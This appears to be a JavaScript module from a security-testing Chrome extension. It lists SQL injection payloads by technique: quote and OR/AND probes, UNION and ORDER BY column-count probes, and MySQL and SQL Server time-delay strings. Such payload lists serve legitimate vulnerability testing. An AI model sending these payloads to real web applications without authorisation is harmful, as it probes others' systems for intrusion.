// SQL Injection Payloads Library
// No ES6 exports - using global scope for Chrome Extension

const SQLiPayloads = {
    getErrorBasedPayloads: function(safeMode = true) {
        const basic = [
            { value: "'", description: "Single quote" },
            { value: '"', description: "Double quote" },
            { value: "' OR '1'='1", description: "Basic OR injection" },
            { value: "' UNION SELECT NULL--", description: "Basic UNION injection" },
            { value: "'; --", description: "SQL comment" },
            { value: "' AND '1'='2", description: "False condition" }
        ];
        return basic;
    },

    getBooleanBasedPayloads: function() {
        return [
            { value: "' OR 1=1--", description: "Always true" },
            { value: "' OR 1=2--", description: "Always false" },
            { value: "' AND 1=1--", description: "True condition" },
            { value: "' AND 1=2--", description: "False condition" }
        ];
    },

    getTimeBasedPayloads: function() {
        return [
            { value: "'; SELECT SLEEP(2); --", description: "MySQL SLEEP", expectedDelay: 2000 },
            { value: "'; WAITFOR DELAY '00:00:02'; --", description: "SQL Server WAITFOR", expectedDelay: 2000 }
        ];
    },

    getUnionBasedPayloads: function() {
        return [
            { value: "' UNION SELECT NULL--", description: "UNION with 1 column" },
            { value: "' UNION SELECT NULL,NULL--", description: "UNION with 2 columns" },
            { value: "' UNION SELECT NULL,NULL,NULL--", description: "UNION with 3 columns" },
            { value: "' ORDER BY 1--", description: "Column count detection" },
            { value: "' ORDER BY 100--", description: "Column overflow test" }
        ];
    }
};
